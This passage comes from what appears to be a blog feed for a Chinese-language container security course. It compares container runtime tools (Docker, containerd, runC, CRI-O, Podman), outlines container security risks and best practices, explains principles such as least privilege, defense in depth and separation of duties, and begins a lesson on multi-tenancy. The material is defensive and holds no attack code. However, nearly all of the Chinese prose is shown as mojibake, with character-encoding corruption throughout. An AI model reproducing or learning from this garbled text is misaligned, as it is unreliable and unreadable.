Runtime</td><td>æ›´æŠ½è±¡ï¼Œè¿˜æä¾›äº†é™¤äº†åŸºæœ¬çš„å®¹å™¨è¿è¡Œä¹‹å¤–çš„å…¶ä»–åŠŸèƒ½ã€‚</td><td>é•œåƒç®¡ç†ï¼›åŸºæœ¬çš„ç½‘ç»œåŠŸèƒ½ï¼›å‹å¥½çš„ç”¨æˆ·äº¤äº’ï¼›</td><td>æ›´å¹¿æ³›çš„ç®¡ç†åŠŸèƒ½ï¼Œé€šå¸¸ä¸ç¼–æ’å¹³å°é›†æˆï¼›</td><td>æŠ½è±¡äº¤äº’ï¼Œé€šå¸¸éœ€è¦é€šè¿‡é¢å¤–çš„ç•Œé¢è¿›è¡Œï¼›</td><td>é€šå¸¸åŒ…æ‹¬æˆ–é›†æˆäº†é¢å¤–çš„å®‰å…¨åŠŸèƒ½ï¼›</td><td>å…¨é¢çš„å®¹å™¨ç®¡ç†ï¼›é€‚ç”¨äºå¼€å‘ç¯å¢ƒï¼›</td></tr><tr><td>ä¸“é—¨çš„ Runtime</td><td>ä¸ºç‰¹å®šçš„å¹³å°æˆ–ç”¨ä¾‹å®šåˆ¶çš„ Runtimeï¼Œä¾‹å¦‚ï¼škubernetes çš„è¾¹ç¼˜è®¡ç®—</td><td>é’ˆå¯¹ç‰¹å®šçš„å¹³å°è¿›è¡Œäº†ä¼˜åŒ–ï¼›å¯èƒ½åŒ…æ‹¬é’ˆå¯¹ç‰©è”ç½‘ç­‰ç‰¹å®šç¯å¢ƒçš„åŠŸèƒ½ï¼›</td><td>æ ¹æ®ç‰¹å®š Runtime åŠé¢„æœŸç”¨ä¾‹è€Œå˜åŒ–ï¼›</td><td>å„ä¸ç›¸åŒï¼Œä½†é€šå¸¸ä¼šæ ¹æ®ç‰¹å®šçš„ç¯å¢ƒæˆ–å¹³å°ä¼˜åŒ–</td><td>å¯èƒ½åŒ…æ‹¬é’ˆå¯¹ç›®æ ‡å¹³å°æˆ–ç”¨ä¾‹çš„ä¸“é—¨çš„å®‰å…¨åŠŸèƒ½ï¼›</td><td>Kubernetes éƒ¨ç½²ï¼›è¾¹ç¼˜è®¡ç®—å’Œä»¥ç‰©è”ç½‘ä¸ºä¸­å¿ƒçš„åº”ç”¨ç¨‹åºï¼›</td></tr></tbody></table><h2 id="0x04-å¸¸è§çš„-Runtime-å·¥å…·"><a href="#0x04-å¸¸è§çš„-Runtime-å·¥å…·" class="headerlink" title="0x04 å¸¸è§çš„ Runtime å·¥å…·"></a>0x04 å¸¸è§çš„ Runtime å·¥å…·</h2><p>ç”±äº Runtime åŠŸèƒ½å¼ºå¤§ä¸”ç”¨æˆ·å¹¿æ³›ï¼Œå¸‚åœºä¸Šæœ‰è®¸å¤šå…³äº Runtime çš„å·¥å…·ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th>Runtime å·¥å…·</th><th>æè¿°</th><th>ç‰¹å¾</th><th>å®‰å…¨</th><th>ç”¨ä¾‹</th></tr></thead><tbody><tr><td>Docker</td><td>ç”¨æˆ·åœ¨å®¹å™¨ä¸­åˆ›å»ºã€éƒ¨ç½²å’Œæ“ä½œåº”ç”¨ç¨‹åºçš„å…¨æ–¹ä½çš„å¹³å°</td><td>ç”¨æˆ·å‹å¥½ç•Œé¢ï¼›é›†æˆå®¹å™¨ç¼–æ’ï¼›æ”¯æŒé•œåƒç®¡ç†ï¼›æ”¯æŒè·¨å¹³å°ï¼›</td><td>é›†æˆå®‰å…¨åŠŸèƒ½ï¼›å®šæœŸæ›´æ–°è¡¥ä¸</td><td>å…¨é¢çš„å®¹å™¨ç®¡ç†ï¼›é€‚ç”¨äºå¼€å‘å’Œç”Ÿäº§ç¯å¢ƒï¼›</td></tr><tr><td>containerd</td><td>ä¸šç•Œæ ‡å‡†çš„ Runtimeï¼Œå¼ºè°ƒæ˜“ç”¨æ€§ã€å¯é æ€§å’Œè·¨å¹³å°çš„å…¼å®¹æ€§ï¼›</td><td>æ”¯æŒ OCI æ ¼å¼çš„é•œåƒï¼›æ”¯æŒé•œåƒçš„æ¨é€ä¸æ‹‰å–ï¼›æ”¯æŒå¤šç§Ÿæˆ·ï¼›æ”¯æŒ OCI è¿è¡Œæ—¶è§„èŒƒ</td><td>æ³¨é‡æ ‡å‡†å’Œåˆè§„æ€§ï¼Œè®¾è®¡å®‰å…¨ï¼›å®šæœŸçš„æ¼æ´æ‰«æï¼›</td><td>å…¨é¢çš„å®¹å™¨ç®¡ç†ï¼›é€‚ç”¨äºå¼€å‘å’Œç”Ÿäº§ç¯å¢ƒï¼›</td></tr><tr><td>runC</td><td>åŸºäº OCI æ ‡å‡†çš„å¯åŠ¨å’Œç®¡ç†å®¹å™¨çš„å‘½ä»¤è¡Œç•Œé¢å·¥å…·</td><td>åº•å±‚æ“ä½œï¼›ä¸æ“ä½œç³»ç»Ÿç›´æ¥äº¤äº’ï¼›è½»é‡çº§å’Œç®€çº¦ï¼›ä¸“æ³¨äºå®¹å™¨çš„æ‰§è¡Œï¼›</td><td>åŒ…å«åŸºæœ¬çš„å®‰å…¨åŠŸèƒ½ï¼Œä¸»è¦ä¾èµ–äºå®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿçš„å®‰å…¨åŠŸèƒ½ï¼›æ”¯æŒå®‰å…¨é…ç½®ï¼›</td><td>éœ€è¦ä¸å®¹å™¨è¿›ç¨‹ç›´æ¥äº¤äº’çš„åœºæ™¯ï¼›é«˜åº¦çš„æ§åˆ¶å’Œå®šåˆ¶ï¼›</td></tr><tr><td>CRI-O</td><td>ä¸º Kubernetes ç¯å¢ƒé‡èº«å®šåˆ¶çš„ç²¾ç®€çš„ Runtime</td><td>é’ˆå¯¹ Kubernetes è¿›è¡Œäº†ä¼˜åŒ–ï¼›æ”¯æŒ OCI æ ¼å¼çš„é•œåƒï¼›ä½¿ç”¨ CNI è¿›è¡Œç½‘ç»œè¿æ¥ï¼›é»˜è®¤å®‰å…¨ï¼›</td><td>è®¾è®¡çš„æ—¶å€™å……åˆ†è€ƒè™‘äº† Kubernetes çš„å®‰å…¨æ€§ï¼›å®šæœŸæ›´æ–°ä»¥åº”å¯¹ Kubernetes ç‰¹å®šçš„å¨èƒï¼›</td><td>Kubernetes çš„éƒ¨ç½²ç¯å¢ƒï¼›ä¼˜å…ˆè€ƒè™‘æ•ˆç‡å’Œ Kubernetes å…¼å®¹æ€§çš„ç¯å¢ƒï¼›</td></tr><tr><td>Podman</td><td>ç”±ç¤¾åŒºé©±åŠ¨çš„å¤„ç†å®¹å™¨å’Œ pod çš„ Runtime å·¥å…·ï¼Œä¸ kubernetes ç³»ç»Ÿå®Œå…¨å…¼å®¹</td><td>æ— å®ˆæŠ¤è¿›ç¨‹ä¸”è½»é‡çº§ï¼›ä¸ Docker å…¼å®¹ï¼›æ”¯æŒ Kubernetesï¼›æ”¯æŒè·¨å¹³å°</td><td>rootless æ“ä½œå¢å¼ºäº†å®‰å…¨æ€§ï¼›æ”¯æŒå®‰å…¨é…ç½®å’Œç­–ç•¥ï¼›</td><td>å®‰å…¨ã€è½»é‡çº§çš„å®¹å™¨ç®¡ç†ï¼›å®‰å…¨ä¼˜å…ˆçš„ç¯å¢ƒï¼›ä¸ Kubernetes å…¼å®¹çš„éƒ¨ç½²ï¼›</td></tr></tbody></table><p><a href="https://www.docker.com/" title="Docker">Docker</a>åœ¨ä¼—å¤š Runtime ä¸­è„±é¢–è€Œå‡ºï¼Œæˆä¸ºä¸€ä¸ªå¤šåŠŸèƒ½ä¸”ç”¨æˆ·å‹å¥½çš„å¹³å°ï¼Œéå¸¸é€‚åˆéœ€è¦é›†æˆç¯å¢ƒæ¥æ„å»ºã€åˆ†å‘å’Œè¿è¡Œåº”ç”¨ç¨‹åºçš„å¼€å‘äººå‘˜ï¼›</p><p><a href="https://containerd.io/" title="Containerd">Containerd</a>å’Œ<a href="https://github.com/opencontainers/runc" title="Runc">Runc</a>æä¾›äº†æ›´ä¸“ä¸šå’Œæ›´åº•å±‚çš„åŠŸèƒ½ï¼Œåœ¨ Runtime çš„æ ¸å¿ƒæ–¹é¢ç²¾ç›Šæ±‚ç²¾ï¼›</p><p><a href="https://github.com/cri-o/cri-o" title="CRI-O">CRI-O</a>é’ˆå¯¹ Kubernetes è¿›è¡Œä¼˜åŒ–ï¼Œä½¿å…¶æˆä¸º Kubernetes ç”Ÿæ€ç³»ç»Ÿä¸­å¯ä»¥æŠ•å…¥å¤§é‡èµ„é‡‘çš„é¦–è¦é€‰æ‹©ï¼›</p><p><a href="https://podman.io/" title="Podman">Podman</a>é€šè¿‡ä½¿ç”¨æ— å®ˆæŠ¤è¿›ç¨‹çš„å®¹å™¨ç®¡ç†è„±é¢–è€Œå‡ºï¼Œæä¾›äº†ä¸€ç§ç‹¬ç‰¹çš„æ–¹æ³•ï¼Œä¸ä»¥å®‰å…¨ä¸ºé‡ç‚¹çš„ç®€çº¦ç¯å¢ƒå®Œç¾å¥‘åˆï¼›</p><p>æ€»è€Œè¨€ä¹‹ï¼Œä¸åŒç§ç±»çš„ Runtime åæ˜ äº†å®¹å™¨é¢†åŸŸä¸­ä¸æ–­å‘å±•çš„å¤šæ ·åŒ–çš„éœ€æ±‚ï¼Œä¹Ÿä¸ºå„ç§éƒ¨ç½²ç­–ç•¥å’Œè¿è¡Œè¦æ±‚æä¾›äº†å®šåˆ¶çš„è§£å†³æ–¹æ¡ˆï¼›</p><h2 id="0x05-å®‰å…¨é£é™©"><a href="#0x05-å®‰å…¨é£é™©" class="headerlink" title="0x05 å®‰å…¨é£é™©"></a>0x05 å®‰å…¨é£é™©</h2><p>å®¹å™¨åŒ–çš„ç¯å¢ƒæœ¬è´¨ä¸Šæ¯”ä¼ ç»Ÿçš„å·¥ä½œè´Ÿè½½æ›´åŠ å¤æ‚ï¼Œå…·ä½“ä½“ç°åœ¨ï¼š</p><ol><li><strong>æ›´å¤§çš„æ”»å‡»é¢ã€‚</strong> ç”±äºå®¹å™¨åŠå…¶å„ç§åº•å±‚é•œåƒçš„å¤šæ ·æ€§ï¼Œå…¶æ”»å‡»é¢æ¯”ä¼ ç»Ÿçš„å·¥ä½œè´Ÿè½½è¦å¤§å¾—å¤šï¼›</li><li><strong>å…±äº«å†…æ ¸çš„æ¶æ„ã€‚</strong> å®¹å™¨å…±äº«å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿå†…æ ¸ã€‚å› æ­¤ï¼Œä»…ä¿æŠ¤ä¸»æœºçš„å®‰å…¨æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹å®¹å™¨ä¹‹é—´çš„éš”ç¦»è¿›è¡Œå®‰å…¨é…ç½®ã€‚è‹¥æ²¡æœ‰è¿›è¡Œå®‰å…¨é…ç½®ï¼Œå®¹å™¨ä¸­çš„ä»»ä½•æ¼æ´éƒ½æœ‰å¯èƒ½ä¼šå±å®³æ•´ä¸ªä¸»æœºï¼›</li><li><strong>åŠ¨æ€ç¯å¢ƒã€‚</strong> å®¹å™¨åŒ–å·¥ä½œè´Ÿè½½çš„é«˜åº¦åŠ¨æ€ç‰¹æ€§å¸¦æ¥äº†å¯è§‚æµ‹æ€§çš„æŒ‘æˆ˜ï¼Œè¿™ä½¿å¾—ä¼ ç»Ÿçš„ç›‘æ§å·¥å…·éš¾ä»¥è·Ÿè¸ªï¼›</li></ol><p>å› æ­¤ï¼Œé‡‡ç”¨æ•´ä½“çš„å®‰å…¨ç­–ç•¥è‡³å…³é‡è¦ã€‚ç†æƒ³çš„å®‰å…¨ç­–ç•¥åº”è¯¥æ¶µç›–é•œåƒæ„å»ºåˆ° Runtime çš„ç›‘æ§çš„æ–¹æ–¹é¢é¢ï¼Œä¾‹å¦‚ï¼š</p><ol><li><strong>é•œåƒå®‰å…¨é˜²æŠ¤</strong>ã€‚åœ¨é•œåƒéƒ¨ç½²ä¹‹å‰å…ˆè¿›è¡Œæ¼æ´æ‰«æï¼Œå¹¶ä¿®å¤é•œåƒä¸­çš„æ¼æ´ï¼›</li><li><strong>é•œåƒä»“åº“å®‰å…¨é˜²æŠ¤</strong>ã€‚åœ¨é•œåƒä»“åº“ä¸­å®æ–½å®‰å…¨è®¿é—®æ§åˆ¶ä¸é•œåƒç­¾åï¼›</li></ol><p>å› ä¸ºï¼Œæœ€ä½³çš„å®¹å™¨å®‰å…¨çš„å®è·µåº”è¯¥ä¸ºï¼š</p><ol><li><strong>ç¡®ä¿éƒ¨ç½²ç¯å¢ƒçš„å®‰å…¨ã€‚</strong> å®æ–½æ›´å¼ºå¤§çš„é˜²ç«å¢™è§„åˆ™ï¼Œå¯¹å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿè¿›è¡ŒåŠ å›ºï¼›ä½¿ç”¨æä¾›å®‰å…¨çš„ API æ¥å£å’Œ RBAC çš„ç¼–æ’å·¥å…·ï¼›éµå¾ªæœ€å°æƒé™åŸåˆ™ï¼Œå°†å®¹å™¨é…ç½®æˆä»¥æœ€å°çš„æƒé™è¿è¡Œï¼Œé¿å…ä»¥ root æˆ–é«˜æƒé™è¿è¡Œå®¹å™¨ï¼›ç¡®ä¿é•œåƒä¸­æœªåµŒå…¥ secretï¼›</li><li><strong>ç›‘æ§å®¹å™¨äº’åŠ¨ã€‚</strong> å®æ–½ç»†ç²’åº¦çš„ç›‘æ§ï¼Œä»¥æä¾›å®¹å™¨å¥åº·å’Œè¡Œä¸ºçš„å¯è§æ€§ã€‚</li></ol><h2 id="0x06-ç»“è®º"><a href="#0x06-ç»“è®º" class="headerlink" title="0x06 ç»“è®º"></a>0x06 ç»“è®º</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬äº†è§£åˆ° Runtime ä¸»è¦è´Ÿè´£ä»å®¹å™¨é•œåƒä»“åº“ä¸­æ‹‰å–é•œåƒã€ç®¡ç†é•œåƒçš„ç”Ÿå‘½å‘¨æœŸï¼Œä»¥åŠåœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œå®¹å™¨çš„æ‰€æœ‰æ“ä½œã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å›é¡¾äº† Runtime çš„å†å²ï¼Œäº†è§£å®ƒä»¬åœ¨ç°ä»£è½¯ä»¶å¼€å‘ä¸­çš„ä½œç”¨ä»¥åŠä¸è™šæ‹Ÿæœºçš„åŒºåˆ«ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬è¿˜ç ”ç©¶äº†ä¸åŒç±»å‹çš„ Runtime å·¥å…·ä¹‹é—´çš„åŒºåˆ«åŠå…¶å®‰å…¨é£é™©ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥çœ‹æˆ‘ä»¬çš„ã€å®¹å™¨å®‰å…¨é˜²æŠ¤åŸºç¡€ã€‘è¯¾ç¨‹ä¸­çš„ï¼š</p><ul><li><a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">ã€Š1.2 å®¹å™¨å¨èƒæ¨¡å‹ã€‹</a></li><li><a href="../../../../2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/">ã€Š1.3 å®‰å…¨è¾¹ç•Œã€‹</a></li><li><a href="../../../../2024/06/18/1-5-%E5%AE%89%E5%85%A8%E5%8E%9F%E5%88%99/">ã€Š1.5 å®‰å…¨åŸåˆ™ã€‹</a></li></ul><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†ç®€å•åˆ†æä¸€ä¸‹ï¼šDockerã€containerdã€CRI-O å’Œ runc ä¹‹é—´çš„åŒºåˆ«ï½</p><hr>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.5 å®‰å…¨åŸåˆ™</title>
    <link href="/2024/06/18/1-5-%E5%AE%89%E5%85%A8%E5%8E%9F%E5%88%99/"/>
    <url>/2024/06/18/1-5-%E5%AE%89%E5%85%A8%E5%8E%9F%E5%88%99/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ€åï¼Œæˆ‘ä»¬æ¥ä»‹ç»ä¸€èˆ¬æ€§çš„æŒ‡å¯¼æ–¹é’ˆï¼Œæ— è®ºæ‚¨å¯¹ä»»ä½•ç¯å¢ƒè¿›è¡Œé˜²æŠ¤ï¼Œè¿™äº›åŸåˆ™éƒ½è¢«è®¤ä¸ºæ˜¯æœ€ä½³çš„æ–¹æ³•ã€‚</p><h2 id="0x01-æœ€å°æƒé™åŸåˆ™"><a href="#0x01-æœ€å°æƒé™åŸåˆ™" class="headerlink" title="0x01 æœ€å°æƒé™åŸåˆ™"></a>0x01 æœ€å°æƒé™åŸåˆ™</h2><p><strong>æ‚¨åº”è¯¥é™åˆ¶ä¸€ä¸ªäººæˆ–ä¸€ä¸ªç»„ä»¶çš„æƒé™ï¼Œè®©å®ƒç”¨æœ€å°çš„æƒé™ä¹Ÿå¯ä»¥å®Œæˆå·¥ä½œã€‚</strong></p><p>ä¾‹å¦‚ï¼š</p><ul><li>è‹¥ä¸€ä¸ªå¾®æœåŠ¡çš„åŠŸèƒ½ä»…ä»…æ˜¯åœ¨ç”µå­å•†åŠ¡åº”ç”¨ä¸­å¯¹äº§å“æœç´¢ï¼›</li></ul><p>é‚£ä¹ˆï¼Œå¯ä»¥æ‹¥æœ‰çš„æƒé™ä¸ºï¼š</p><ul><li>ä»¥åªè¯»çš„æ–¹å¼è®¿é—®äº§å“çš„æ•°æ®åº“æ•°æ®ï¼›</li></ul><p>è¿™æ—¶ï¼Œä¸èƒ½æ‹¥æœ‰çš„æƒé™ä¸ºï¼š</p><ul><li>è®¿é—®ç”¨æˆ·ä¿¡æ¯ï¼›</li><li>è®¿é—®æ”¯ä»˜ä¿¡æ¯ï¼›</li><li>å†™å…¥äº§å“ä¿¡æ¯ï¼›</li></ul><h2 id="0x02-çºµæ·±é˜²å¾¡"><a href="#0x02-çºµæ·±é˜²å¾¡" class="headerlink" title="0x02 çºµæ·±é˜²å¾¡"></a>0x02 çºµæ·±é˜²å¾¡</h2><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä»‹ç»å¤šç§æ–¹å¼å¯ä»¥æå‡æ‚¨çš„éƒ¨ç½²ç¯å¢ƒåŠè¿è¡Œåœ¨è¯¥ç¯å¢ƒä¸­çš„åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p><p>ä½†è¯¥åŸåˆ™å‘Šè¯‰æˆ‘ä»¬ï¼š<strong>æ‚¨åº”è¯¥ä½¿ç”¨å¤šå±‚é˜²æŠ¤æœºåˆ¶</strong>ï¼Œå³å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿçªç ´ä¸€å±‚é˜²å¾¡ï¼Œå¦ä¸€å±‚é˜²å¾¡åˆ™åº”è¯¥é˜»æ­¢ä»–ä»¬å¯¹æ‚¨çš„éƒ¨ç½²ç¯å¢ƒé€ æˆä¼¤å®³æˆ–çªƒå–ä½ çš„æ•°æ®ã€‚</p><h2 id="0x03-å‡å°‘æ”»å‡»é¢"><a href="#0x03-å‡å°‘æ”»å‡»é¢" class="headerlink" title="0x03 å‡å°‘æ”»å‡»é¢"></a>0x03 å‡å°‘æ”»å‡»é¢</h2><p>ä¸€èˆ¬è€Œè¨€ï¼Œä¸€ä¸ªç³»ç»Ÿè¶Šå¤æ‚ï¼Œæ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§å°±è¶Šé«˜ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ç®€åŒ–ç³»ç»Ÿçš„å¤æ‚æ€§ï¼Œä»¥å‡å°‘ç³»ç»Ÿçš„æ”»å‡»é¢</strong>ã€‚ä¾‹å¦‚ï¼š</p><ul><li>å°½å¯èƒ½åœ°è®©æ¥å£å°è€Œç®€å•ï¼Œä»è€Œå‡å°‘è®¿é—®è·¯å¾„ï¼›</li><li>é™åˆ¶å¯ä»¥è®¿é—®æœåŠ¡çš„ç”¨æˆ·å’Œç»„ä»¶ï¼›</li><li>æœ€å°åŒ–ä»£ç é‡ï¼›</li></ul><h2 id="0x04-é™åˆ¶çˆ†ç‚¸åŠå¾„"><a href="#0x04-é™åˆ¶çˆ†ç‚¸åŠå¾„" class="headerlink" title="0x04 é™åˆ¶çˆ†ç‚¸åŠå¾„"></a>0x04 é™åˆ¶çˆ†ç‚¸åŠå¾„</h2><p><strong>å°†ç³»ç»Ÿçš„å®‰å…¨æ§åˆ¶åˆ†å‰²æˆæ›´å°çš„å­ç»„ä»¶æˆ–å•å…ƒã€‚</strong> å¦‚æœæœ€åçš„äº‹æƒ…å‘ç”Ÿäº†ï¼Œé‚£ä¹ˆå…¶å½±å“èŒƒå›´å°±ä¼šå—åˆ°é™åˆ¶ã€‚</p><p>å®¹å™¨å°±éå¸¸é€‚ç”¨äºè¯¥åŸåˆ™ï¼Œå› ä¸ºæ‚¨å¯ä»¥å°†æ¶æ„åˆ’åˆ†ä¸ºå¤šä¸ªå¾®æœåŠ¡çš„å®ä¾‹ï¼Œç„¶åä½¿ç”¨å®¹å™¨æ¥å……å½“å®‰å…¨è¾¹ç•Œã€‚</p><h2 id="0x05-èŒè´£åˆ†ç¦»"><a href="#0x05-èŒè´£åˆ†ç¦»" class="headerlink" title="0x05 èŒè´£åˆ†ç¦»"></a>0x05 èŒè´£åˆ†ç¦»</h2><p>è¯¥åŸåˆ™ä¸å‰é¢çš„æœ€å°æƒé™å’Œé™åˆ¶çˆ†ç‚¸åŠå¾„ç›¸å…³ï¼Œå³<strong>å°½å¯èƒ½åœ°èµ‹äºˆä¸åŒçš„ç»„ä»¶æˆ–äººå‘˜æ‰€éœ€çš„ç³»ç»Ÿæ•´ä½“æœ€å°å­é›†çš„æƒé™</strong>ã€‚</p><p>è¿™æ ·å¯ä»¥ç¡®ä¿è¦æˆåŠŸæ‰§è¡ŒæŸä¸ªæ“ä½œï¼Œå¿…é¡»æ‹¥æœ‰å¤šä¸ªç”¨æˆ·çš„æƒé™ï¼Œä»è€Œé™åˆ¶äº†å•ä¸ªç‰¹æƒç”¨æˆ·è¢«æ”»é™·å¯èƒ½ä¼šé€ æˆçš„ä¼¤å®³ã€‚</p><h2 id="0x06-åº”ç”¨"><a href="#0x06-åº”ç”¨" class="headerlink" title="0x06 åº”ç”¨"></a>0x06 åº”ç”¨</h2><p>è‹¥æ‚¨åšæŒå­¦å®Œæœ¬è¯¾ç¨‹ï¼Œæ‚¨å°†çœ‹åˆ°ï¼šå®¹å™¨çš„ç»†ç²’åº¦éå¸¸é€‚åˆåº”ç”¨è¿™äº›å®‰å…¨åŸåˆ™ã€‚</p><ul><li><p><strong>æœ€å°æƒé™</strong></p><p>æ‚¨å¯ä»¥ä¸ºä¸åŒçš„å®¹å™¨åˆ†é…å¯ä»¥å®Œæˆå…¶ä»»åŠ¡çš„æœ€å°çš„æƒé™é›†ã€‚</p></li><li><p><strong>æ·±åº¦é˜²å¾¡</strong></p><p>å®¹å™¨ä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªå®‰å…¨è¾¹ç•Œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªå®‰å…¨è¾¹ç•Œä¸­å¼ºåˆ¶åœ°å®æ–½å®‰å…¨é˜²æŠ¤æªæ–½ã€‚</p></li><li><p><strong>å‡å°‘æ”»å‡»é¢</strong></p><p>å°†å•ä½“åº”ç”¨æ‹†åˆ†ä¸ºç®€å•çš„å¾®æœåŠ¡ï¼Œå¹¶åœ¨å®ƒä»¬ä¹‹é—´åˆ›å»ºæ¸…æ™°çš„æ¥å£ã€‚</p><p>å¾®æœåŠ¡ç»“æ„å¦‚æœè®¾è®¡å¾—å½“ï¼Œå¯ä»¥å‡å°‘ç³»ç»Ÿçš„å¤æ‚æ€§ï¼Œä»è€Œå¯ä»¥å‡å°‘ä¾›ç»™é¢ã€‚ä½†ä¹Ÿæœ‰äººè®¤ä¸ºï¼Œå®¹å™¨çš„ç¼–æ’è°ƒåº¦ä¼šå˜å¾—å¤æ‚ï¼Œè¿™åˆä¼šå¼•å…¥å¦å¤–ä¸€ä¸ªä¾›ç»™é¢äº†ã€‚</p></li><li><p><strong>é™åˆ¶çˆ†ç‚¸åŠå¾„</strong></p><p>å¦‚æœå®¹å™¨åŒ–çš„åº”ç”¨ç¨‹åºè¢«æ”»é™·äº†ï¼Œé‚£ä¹ˆå®‰å…¨æ§åˆ¶å¯ä»¥è®©æ”»å‡»ä»…åœ¨å®¹å™¨å†…éƒ¨å‘ç”Ÿï¼Œè€Œä¸ä¼šå½±å“åˆ°ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚</p></li><li><p><strong>èŒè´£åˆ†ç¦»</strong></p><p>æƒé™å’Œå‡­è¯åªèƒ½ä¼ é€’åˆ°æ‰€éœ€è¦çš„å®¹å™¨ä¸­ï¼Œè¿™æ ·ä¸€ç»„å¯†é’¥çš„æ³„æ¼ä¸ä¸€å®šæ„å‘³ç€æ‰€æœ‰å¯†é’¥éƒ½ä¼šè¢«æ³„æ¼ã€‚</p></li></ul><h2 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h2><p>è¿™äº›åŸåˆ™å¬èµ·æ¥å¾ˆä¸é”™ï¼Œä½†æ˜¯åœ¨å®é™…ä½¿ç”¨ä¸­å¾€å¾€ä¼šè¢«ä¸è‰¯çš„é”™è¯¯ç³»ç»Ÿé…ç½®ã€å—æ±¡æŸ“çš„å®¹å™¨é•œåƒæˆä»½æˆ–ä¸å®‰å…¨çš„æ“ä½œæ‰€æŠµæ¶ˆã€‚æˆ‘ä»¬å¸Œæœ›å¯ä»¥é€šè¿‡æœ¬è¯¾ç¨‹çš„å­¦ä¹ ï¼Œæ‚¨å°†èƒ½å¤Ÿé¿å…å®¹å™¨åŒ–éƒ¨ç½²ç¯å¢ƒä¸­å¯èƒ½å‡ºç°çš„å®‰å…¨é™·é˜±ï¼Œå¹¶å……åˆ†åˆ©ç”¨å…¶å¸¦æ¥çš„å¥½å¤„ã€‚</p><p>ç»è¿‡<a href="../../../../2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/">ã€Šç¬¬ 1 è¯¾ å®¹å™¨å®‰å…¨å¨èƒå»ºæ¨¡ã€‹</a>çš„å­¦ä¹ ï¼Œæ‚¨å·²ç»å¯¹å®¹å™¨ç¯å¢ƒçš„æ”»å‡»æœ‰äº†ä¸€ä¸ªè¾ƒé«˜çš„å±‚æ¬¡çš„è§†è§’ï¼Œå¹¶ä¸”äº†è§£äº†å¯ä»¥æŠµå¾¡è¿™äº›æ”»å‡»çš„å®‰å…¨åŸåˆ™ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨æ”¯æ’‘èµ·å®¹å™¨çš„åº•å±‚æŠ€æœ¯ï¼Œä»¥ä¾¿äºäº†è§£å¦‚ä½•ç»“åˆå®‰å…¨å·¥å…·å’Œæœ€ä½³å®è·µæµç¨‹æ¥å®æ–½è¿™äº›å®‰å…¨åŸåˆ™ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.4 å¤šç§Ÿæˆ·</title>
    <link href="/2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/"/>
    <url>/2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æˆ‘ä»¬åœ¨<a href="../../../../2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/">ã€Š1.3 å®‰å…¨è¾¹ç•Œã€‹</a>ä¸­ç®€å•è¯´æ˜äº†å®‰å…¨è¾¹ç•Œçš„æ¦‚å¿µå’Œé‡è¦æ€§ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œâ€œå¤šç§Ÿæˆ·â€æ˜¯äº‘è®¡ç®—çš„ä¸€å¤§ç‰¹ç‚¹ï¼Œè€Œäº‘åŸç”Ÿæ˜¯â€œäº‘è®¡ç®— 2.0â€ã€‚æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥çœ‹çœ‹å¤šç§Ÿæˆ·ç¯å¢ƒä¸‹ï¼Œå…¶å®‰å…¨è¾¹ç•Œå°†é¢ä¸´å“ªäº›å¨èƒã€‚</p><h2 id="0x01-å¤šç§Ÿæˆ·çš„æ¦‚å¿µ"><a href="#0x01-å¤šç§Ÿæˆ·çš„æ¦‚å¿µ" class="headerlink" title="0x01 å¤šç§Ÿæˆ·çš„æ¦‚å¿µ"></a>0x01 å¤šç§Ÿæˆ·çš„æ¦‚å¿µ</h2><p>åœ¨ 20 ä¸–çºª 60 å¹´ä»£çš„å¤§å‹æœºæ—¶ä»£ï¼Œå¤šç§Ÿæˆ·çš„æ¦‚å¿µå°±å­˜åœ¨äº†ï¼Œå½“æ—¶çš„ç”¨æˆ·å¯ä»¥ç§Ÿç”¨å…±äº«æœºå™¨ä¸Šçš„ CPU 